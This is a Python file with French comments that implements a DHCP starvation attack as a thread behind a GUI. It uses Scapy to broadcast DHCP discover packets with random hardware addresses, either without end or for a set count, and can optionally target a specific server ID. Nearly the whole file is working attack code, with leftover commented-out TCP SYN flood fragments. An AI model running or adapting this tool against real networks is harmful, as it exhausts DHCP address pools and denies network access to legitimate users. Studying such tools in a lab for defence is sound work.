import time
import random
import threading
from scapy.all import *
import dhcp_starvation_graphique
import sys

class dhcp_starvation(threading.Thread):

	
	#def __init__:
	#	self.stop=False

	def __init__(self,ip_src,nombre,attente,interface):
		conf.checkIpAddr=False
		threading.Thread.__init__(self)
		self.stopper=threading.Event()
		#self.stopper.set(True)
		
		#tcp_syn_graphique_2.verrou=threading.Lock()
		

		
			
		#if(tcp_syn_graphique_2.test_fenetre.check_verrou()):	
		#	print("\n ERREUR ATTAQUE EN COURS DETECTEE")
		#	sys.exit(1)	
		#else:
		#	print("\n AUCUNE ATTAQUE EN COURS DETECTEE")
		#	tcp_syn_graphique_2.edit_verrou(True)	
				
		
		#self.arret=True
		#self._stopevent=threading.Event()
		##TEST DE L'ADRESSE IP SOURCE
				
		self.ip_src=ip_src

		
		##TEST DE L'INTERFACE D'ENVOI
		if(interface != ""):
			print("interface non choisie automatiquement")
			conf.iface=interface
		else:
			print("interface choisie automatiquement")

		if(interface != ""):
			print("INTERFACE D'ENVOI DES PAQUETS:"+interface)
		else:
			print("INTERFACE D'ENVOI DES PAQUETS:"+conf.iface)
			
		##TEST DU DELAI AVANT CHAQUE ENVOI
		if(attente == ""):
			self.delai=0.2
		else:
			self.delai=float(attente)


		if(nombre == ""):
			self.n=-1
		else:
			self.n=int(nombre)

		#print("ip spoure="+self.ip.src)
		#print("port spoure="+str(self.p1)+"-"+str(self.p2))
		#print("ip destination="+str(self.ip.dst))
		#print("port destination="+str(port_dst))

	def run(self):	
		
		print("etat du verrou="+str(dhcp_starvation_graphique.verrou.locked()))
		if(dhcp_starvation_graphique.verrou.locked()):
			print("\n ERREUR ATTAQUE EN COURS DETECTEE")
			#sys.exit(1)
		else:
			print("\n AUCUNE ATTAQUE EN COURS DETECTEE\n")

			dhcp_starvation_graphique.verrou.acquire()

			print("\n Lancement de l'attaque DHCP STARVATION --"+time.ctime()+"\n")

			#print("ip spoure="+self.ip.src)
			#print("port spoure="+str(self.p1)+"-"+str(self.p2))
			#print("ip destination="+str(self.ip.dst))
			#print("port destination="+str(self.portdst))	
			
			#self.arp.show()	
		
			#time.sleep(3)
			#self.arret=False
			self.ether=Ether(dst="ff:ff:ff:ff:ff:ff")
			self.ip=IP(src="0.0.0.0", dst="255.255.255.255")
			self.udp=UDP(sport=68, dport=67)
			self.bootp=BOOTP(chaddr=RandString(12, '0123456789abcdef'))
			self.i=0
			

			if(self.ip_src==""):			

				self.dhcp=DHCP(options=[("message-type", "discover"),("end")])

				self.paquet=(self.ether/self.ip/self.udp/self.bootp/self.dhcp)
				
				self.paquet.show()
				
				time.sleep(3)
	
				if(self.n == -1):
					while(1==1 and not(self.stopper.isSet())):
					#while(1==1 and not(self.arret)):
						#port=random.randint(self.p1,self.p2)
						#sequence=random.randint(self.s1,self.s2)
						#tcp_syn=TCP(sport=port,dport=self.portdst,flags="S",seq=sequence)
		
						'''CREATION DU PAQUET'''
						
					
						sendp(self.paquet)
						time.sleep(self.delai)
						#print("paquet numero="+str(self.i))
						#self.i=self.i+1
				
						#print(self.stopper.set())

					#print("Fin des Traitements, arret de l'attaque")
					#print("arret="+str(self.arret))
					if(not self.stopper.isSet()):
						print("FIN D'EMISSIONS DES PAQUETS"+time.ctime()+"\n")
					else:
						print("FIN D'EMISSIONS DES PAQUETS (L'ATTAQUE A ETE STOPPER PAR L'UTILISATEUR)"+time.ctime()+"\n")
				else:
					i=0
					for i in range(0,self.n):
						#port=random.randint(self.p1,self.p2)
						#sequence=random.randint(self.s1,self.s2)
						#tcp_syn=TCP(sport=port,dport=self.portdst,flags="S",seq=sequence)
		
						'''CREATION DU PAQUET'''
						paquet=(self.ether/self.ip/self.udp/self.bootp/self.dhcp)
					
						sendp(paquet)
						time.sleep(self.delai)
						#print("paquet numero="+str(self.i))
						#self.i=self.i+1
						#self.arret=True
						#print(self.arret)
						#print(self.stopper.set())
				
						#if(self.arret==True):
						if(self.stopper.isSet()):
							break
					#print("arret="+str(self.arret))
					#print("Fin des Traitements, arret de l'attaque")
					if(not self.stopper.isSet()):
						print("FIN D'EMISSIONS DES PAQUETS"+time.ctime()+"\n")
					else:
						print("FIN D'EMISSIONS DES PAQUETS (L'ATTAQUE A ETE STOPPER PAR L'UTILISATEUR)"+time.ctime()+"\n")

			else:
				self.dhcp=DHCP(options=[("message-type", "discover"),("server_id", self.ip_src),"end"])

				self.paquet=(self.ether/self.ip/self.udp/self.bootp/self.dhcp)
				
				self.paquet.show()
			
				time.sleep(3)

				if(self.n == -1):

					while(1==1 and not(self.stopper.isSet())):
					#while(1==1 and not(self.arret)):
						#port=random.randint(self.p1,self.p2)
						#sequence=random.randint(self.s1,self.s2)
						#tcp_syn=TCP(sport=port,dport=self.portdst,flags="S",seq=sequence)
		
						'''CREATION DU PAQUET'''
					
						sendp(self.paquet)
						time.sleep(self.delai)
						#print("paquet numero="+str(self.i))
						#self.i=self.i+1
				
						#print(self.stopper.set())

					#print("Fin des Traitements, arret de l'attaque")
					#print("arret="+str(self.arret))
					if(not self.stopper.isSet()):
						print("FIN D'EMISSIONS DES PAQUETS"+time.ctime()+"\n")
					else:
						print("FIN D'EMISSIONS DES PAQUETS (L'ATTAQUE A ETE STOPPER PAR L'UTILISATEUR)"+time.ctime()+"\n")
				else:
					i=0
					for i in range(0,self.n):
						#port=random.randint(self.p1,self.p2)
						#sequence=random.randint(self.s1,self.s2)
						#tcp_syn=TCP(sport=port,dport=self.portdst,flags="S",seq=sequence)
		
						'''CREATION DU PAQUET'''
						paquet=(self.ether/self.ip/self.udp/self.bootp/self.dhcp)
					
						sendp(paquet)
						time.sleep(self.delai)
						#print("paquet numero="+str(self.i))
						#self.i=self.i+1
						#self.arret=True
						#print(self.arret)
						#print(self.stopper.set())
				
						#if(self.arret==True):
						if(self.stopper.isSet()):
							break
					#print("arret="+str(self.arret))
					#print("Fin des Traitements, arret de l'attaque")
					if(not self.stopper.isSet()):
						print("FIN D'EMISSIONS DES PAQUETS"+time.ctime()+"\n")
					else:
						print("FIN D'EMISSIONS DES PAQUETS (L'ATTAQUE A ETE STOPPER PAR L'UTILISATEUR)"+time.ctime()+"\n")

			dhcp_starvation_graphique.verrou.release()
				#tcp_syn_graphique_2.edit_verrou(False)

	
	def state_launch_boutton(self):
		return self.stopper.isSet()
	
	def stop(self):
		#self.arret=True
		self.stopper.set()
		#print(self.arret)
		#print(self.stopper.set())
	
	def randommac(self):
		mac = [ random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
			random.randint(0x00, 0x7f),
			random.randint(0x00, 0xff),
			random.randint(0x00, 0xff) ]
		return ':'.join(map(lambda x: "%02x" % x, mac))		
